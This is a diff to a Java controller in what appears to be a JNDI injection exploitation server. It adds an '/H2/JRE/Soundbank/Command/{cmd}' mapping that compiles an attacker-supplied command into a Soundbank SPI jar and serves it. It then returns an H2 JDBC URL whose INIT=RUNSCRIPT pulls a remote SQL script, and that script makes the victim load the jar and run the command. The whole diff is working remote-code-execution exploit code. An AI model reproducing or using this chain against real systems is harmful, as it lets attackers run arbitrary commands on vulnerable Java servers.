@@ -2,12 +2,15 @@ package map.jndi.controller;
 
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtField;
 import map.jndi.Config;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.server.WebServer;
 import map.jndi.template.DerbyJarTemplate;
+import map.jndi.template.SoundbankTemplate;
 import map.jndi.util.JarUtil;
 import map.jndi.util.MiscUtil;
+import map.jndi.util.ReflectUtil;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -167,6 +170,50 @@ public abstract class DatabaseController implements Controller {
         props.setProperty("driver", "org.h2.Driver");
         props.setProperty("url", url);
 
+        return props;
+    }
+
+    @JNDIMapping("/H2/JRE/Soundbank/Command/{cmd}")
+    public Properties h2JRESoundbankCommand(String cmd) {
+        System.out.println("[H2-JRE] [Command] Cmd: " + cmd);
+
+        String className = MiscUtil.getRandStr(12);
+        String jarName = MiscUtil.getRandStr(12) + ".jar";
+
+        byte[] jarBytes = null;
+
+        try {
+            ClassPool pool = ClassPool.getDefault();
+            CtClass clazz = pool.get(SoundbankTemplate.class.getName());
+            clazz.replaceClassName(clazz.getName(), className);
+            ReflectUtil.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));
+
+            jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        WebServer.getInstance().serveFile("/" + jarName, jarBytes);
+
+        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlContent = "CREATE ALIAS NEW_INSTANCE FOR 'org.h2.util.Utils.newInstance(java.lang.String, java.lang.Object[])';\n" +
+                "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
+                "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
+                "CREATE ALIAS GET_SOUNDBANK FOR 'javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)';\n" +
+                "SET @clazz = 'java.net.URL';\n" +
+                "SET @url_str = '" + Config.codebase + jarName + "';\n" +
+                "SET @url_obj = UNESCAPE_VALUE(@url_str);\n" +
+                "SET @obj = NEW_INSTANCE(@clazz, @url_obj);\n" +
+                "CALL SET_PROPERTY('jdk.sound.jarsoundbank', 'true');\n" +
+                "CALL GET_SOUNDBANK(@obj);";
+        WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
+
+        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
+                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+
+        Properties props = new Properties();
+        props.setProperty("driver", "org.h2.Driver");
+        props.setProperty("url", url);
         return props;
     }
 
